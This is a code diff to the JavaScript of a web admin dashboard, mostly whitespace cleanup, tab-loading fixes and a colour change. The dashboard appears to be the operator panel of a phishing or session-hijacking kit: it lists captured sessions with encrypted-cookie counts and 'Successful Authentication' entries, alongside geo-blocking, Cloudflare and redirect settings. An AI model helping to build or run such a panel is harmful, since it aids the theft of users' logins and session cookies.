@@ -878,9 +878,13 @@
                 loadGeoBlockConfig();
             } else if (tabName === 'cloudflare' && isAuthenticated) {
                 loadCloudflareConfig();
-            } else if (tabName === 'security' && isAuthenticated) {
-                loadCloudflareConfig();
                 loadCloudflareStatus();
+                loadBackgroundConfig();
+            } else if (tabName === 'security' && isAuthenticated) {
+                // Only load if security tab elements exist (user navigated there)
+                if (document.getElementById('cf-status')) {
+                    loadCloudflareStatus();
+                }
             }
         }
 
@@ -1093,31 +1097,31 @@
 
                     // Build session info HTML with proper null checks
                     let sessionInfoHtml = `<div>ID: ${session.id || 'N/A'}</div>`;
-                    
+
                     if (session.timestamp) {
                         sessionInfoHtml += `<div class="session-info">TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}</div>`;
                     }
-                    
+
                     if (session.status === 'valid') {
                         sessionInfoHtml += `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>`;
                         sessionInfoHtml += `<div class="session-info" style="color: #22c55e;">Status: Successful Authentication</div>`;
-                        
+
                         // Add session metadata if available
                         if (session.authMethod) {
                             sessionInfoHtml += `<div class="session-info">Auth Method: ${session.authMethod}</div>`;
                         }
                     } else if (session.status === 'invalid') {
                         sessionInfoHtml += `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>`;
-                        
+
                         if (session.errorMessage) {
                             sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Error: ${session.errorMessage}</div>`;
                         }
-                        
+
                         if (session.failureType) {
                             sessionInfoHtml += `<div class="session-info">Type: ${session.failureType}</div>`;
                         }
-                        
-                        sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Status: Failed Authentication</div>`;
+
+                        sessionInfoHtml += `<div class="session-info" style="color: #ef4444;">Status: Failed Authentication</div>`;
                     }
 
                     row.innerHTML = `
@@ -1571,10 +1575,10 @@
                 console.error('Country checkboxes container not found');
                 return;
             }
-            
+
             // Clear any existing content (including "Loading countries..." text)
             container.innerHTML = '';
-            
+
             // Generate and insert country checkboxes
             const checkboxesHtml = COUNTRIES.map(country => {
                 const isChecked = selectedCountries.includes(country.code);
@@ -1586,7 +1590,7 @@
                     </label>
                 `;
             }).join('');
-            
+
             container.innerHTML = checkboxesHtml;
         }
 
@@ -2087,7 +2091,7 @@
         function handleRedirectChange() {
             const select = document.getElementById('redirect-destination');
             const customInput = document.getElementById('custom-redirect-url');
-            
+
             if (select && customInput) {
                 if (select.value === 'custom') {
                     customInput.style.display = 'block';
